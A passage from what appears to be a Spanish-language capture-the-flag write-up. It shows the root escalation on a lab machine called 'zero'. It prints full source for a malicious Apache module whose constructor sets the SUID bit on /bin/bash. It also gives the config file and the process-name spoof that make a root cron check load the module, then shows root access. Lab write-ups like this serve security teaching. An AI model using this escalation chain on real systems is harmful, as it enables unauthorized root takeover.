2026/02/24 18:13:01 CMD: UID=0     PID=7864   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7867   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7868   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7869   | /bin/bash /root/bin/update-stats.sh
2026/02/24 18:13:01 CMD: UID=0     PID=7871   |
2026/02/24 18:13:01 CMD: UID=0     PID=7870   | /bin/bash /root/bin/update-stats.sh
```
### Source

Viendo el contenido del mismo, veo con `pgrep` busca algún proceso de apache en la carpeta `/opt/zroweb`, además busca un patrón especifico y los testea usando `apache2ctl -t`.

```bash
zroadmin@zero:/tmp$ cat /usr/local/bin/zro.web-confcheck
#!/usr/bin/bash
RET=0
while read pid _cmd ; do
	# Replace apache2 with apache2ctl and add -t for test
	cmd="${_cmd/apache2/apache2ctl} -t"
	$cmd >/dev/null 2>&1
	RET=$?
done <<< $(/usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf")
if [[ $RET -eq 0 ]] ; then
	echo 'Configuration correct. \o/'
else
	echo 'Configuration broken. Please fix immediately!' >&2
fi
exit $RET
```
### Apache2 malicious module

En [este repositorio de Github](https://github.com/C0deInBlack/apache2_malicious_module/blob/main/poc.c) vi como puedo crear un compilar un modulo malicioso para `Apache2`

Primero necesito el código que en mi caso quedo asi.

```C#
include "httpd.h"
#include "http_config.h"
#include "apr_pools.h"

// El constructor se ejecuta automáticamente al cargar el .so
__attribute__((constructor))
static void payload() {
    setuid(0);
    setgid(0);
    // Intentamos dar permisos SUID a bash
    system("chmod u+s /bin/bash");
}

// Estructura mínima para que sea un módulo válido
static void register_hooks(apr_pool_t *p) {}

module AP_MODULE_DECLARE_DATA my_module = {
    STANDARD20_MODULE_STUFF,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    register_hooks  // Ahora el tipo coincide
};
```

Luego para compilarlo necesito `apxs`.

```bash
apxs -c -i poc.c
```
### apache2.conf file

Luego en el directorio `/home/zroadmin/.libs` queda el poc.so que voy a necesitar que se cargue.
Así que creo la estructura como dice en el mismo repo sobre la que trabaja `apache2`.

```bash
zroadmin@zero:~$ mkdir -p /home/zroadmin/module/modules/
```

Después copio mi modulo en la ruta.

```bash
zroadmin@zero:~$ cp /home/zroadmin/.libs/poc.so /home/zroadmin/module/modules/
```
### Shell

Y luego, en la carpeta `/module` necesito crear el `apache2.conf` con el siguiente contenido.

```bash
zroadmin@zero:~/module$ cat apache2.conf
LoadModule malicious_module modules/poc.so
```

Ya después para finalizar, necesito crear un proceso en segundo plano ejecute una directiva de configuración que se encuentra en el directorio `/home/zroadmin/module`, de manera que va a cargar mi modulo para luego poder asignarle el bit `SUID` a la bash.

```bash
exec -a "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /home/zroadmin/module -c" sleep 200 &
```

Luego de esperar la siguiente iteración de la tarea programada que ejecuta el script, veo que los permisos de la bash cambiaron.

```bash
zroadmin@zero:~/module$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Por lo que puedo convertirme en root.

```bash
zroadmin@zero:~/module$ bash -p
bash-5.0# id
uid=666(zroadmin) gid=666(zroadmin) euid=0(root) groups=666(zroadmin)
```

```bash
bash-5.0# cat root.txt
9608d...
```

`~Happy Hacking.`
